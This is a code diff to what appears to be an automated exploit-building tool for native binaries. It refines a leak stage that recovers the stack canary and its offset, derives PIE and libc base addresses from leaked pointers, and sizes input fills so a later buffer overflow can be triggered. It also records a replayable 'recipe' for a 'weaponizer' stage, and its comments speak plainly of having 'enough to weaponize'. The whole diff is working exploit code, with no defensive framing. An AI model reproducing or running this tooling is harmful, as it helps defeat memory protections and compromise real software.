@@ -114,6 +114,7 @@ def _bases_from(out: bytes, target_bytes: bytes, libc_data: bytes, fill: bytes) 
     # %s-truncated over-read: reconstruct words from the bytes immediately after our fill marker.
     m = re.search(re.escape(fill[:16]) + rb"+", out) if fill else None
     canary = None
+    canary_pos = None
     if m:
         tail = out[m.end(): m.end() + 32]
         # canary = 0x00 || next 7 non-NUL bytes (its own low byte is NUL and not printed). GUARD:
@@ -124,16 +125,23 @@ def _bases_from(out: bytes, target_bytes: bytes, libc_data: bytes, fill: bytes) 
             printable = sum(1 for b in seven if 0x20 <= b < 0x7f)
             if printable <= 2 and len(set(seven)) >= 4:      # not text, enough entropy
                 canary = int.from_bytes(b"\x00" + seven, "little")
+                # the canary sits right after the printed fill run, so the run LENGTH is the overflow
+                # distance from the buffer start to the canary slot -- a self-derived canary_offset.
+                canary_pos = m.end() - m.start()
         for i in range(0, len(tail) - 5):                    # 6-byte LE pointer runs (0x7f/0x55/0x56)
             if tail[i + 5] in (0x7F, 0x55, 0x56):
                 vals.append(int.from_bytes(tail[i:i + 6], "little"))
     cls = _leak.classify_leak(vals, target_bytes, libc_data)
-    if canary is None:
-        canary = _leak.rop.find_canary(cvals) if hasattr(_leak, "rop") else None
-    if canary is None:
+    if canary is None:                                       # raw over-read: full canary word present
         from .poc import rop as _rop
         canary = _rop.find_canary(cvals)
-    return {"canary": canary, "pie_base": cls.get("pie_base"), "libc_base": cls.get("libc_base")}
+        if canary is not None and m:
+            import struct as _struct
+            at = out.find(_struct.pack("<Q", canary))        # its byte offset from the fill start
+            if at >= m.start():
+                canary_pos = at - m.start()
+    return {"canary": canary, "canary_pos": canary_pos,
+            "pie_base": cls.get("pie_base"), "libc_base": cls.get("libc_base")}
 
 
 def drive_to_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=(), timeout=8.0,
@@ -147,6 +155,22 @@ def drive_to_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=(), ti
     exe, workdir = Path(exe), Path(workdir)
     best = {"canary": None, "pie_base": None, "libc_base": None, "recipe": None}
     best_score = -1
+
+    # Residue-safe fill sizing. A fill longer than the FIXED read it lands in spills its tail into
+    # the pipe; worse, a single leftover byte prematurely satisfies the NEXT read (the overflow),
+    # so the program returns and exits before a weaponizer can send its payload. The over-read that
+    # discloses the bases is the later write(buf, BIG), which dumps past the buffer regardless of how
+    # full it is -- so the fill only has to be present, not oversized. Derive candidate lengths from
+    # the program's own read(N) immediates as N-1 (fills the buffer, leaves the read's delimiter room
+    # and zero residue) and try the SMALL residue-safe ones first, falling back to the generic sweep
+    # when no read sizes are recoverable.
+    _reads = sorted({n for n in read_sizes(target_bytes) if 8 <= n <= 4096})
+    _safe = [n - 1 for n in _reads]
+    _ordered = []
+    for n in _safe + list(fills):
+        if n > 0 and n not in _ordered:
+            _ordered.append(n)
+    fills = tuple(_ordered) or tuple(fills)
 
     def _score(b):
         return sum(1 for k in ("canary", "pie_base", "libc_base") if b.get(k))
@@ -172,7 +196,9 @@ def drive_to_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=(), ti
             sc = _score(bases)
             if sc > best_score:
                 best_score = sc
-                best = {**bases, "inject_at": k, "fill_len": L, "recipe": list(steps)}
+                # recipe = the writes UP TO AND INCLUDING the fill: what a weaponizer replays to
+                # reach + trigger the leak (the overflow is the next read after this).
+                best = {**bases, "inject_at": k, "fill_len": L, "recipe": steps[:k + 1]}
             if bases.get("canary") and (bases.get("pie_base") or bases.get("libc_base")):
                 return best                                  # enough to weaponize
     return best
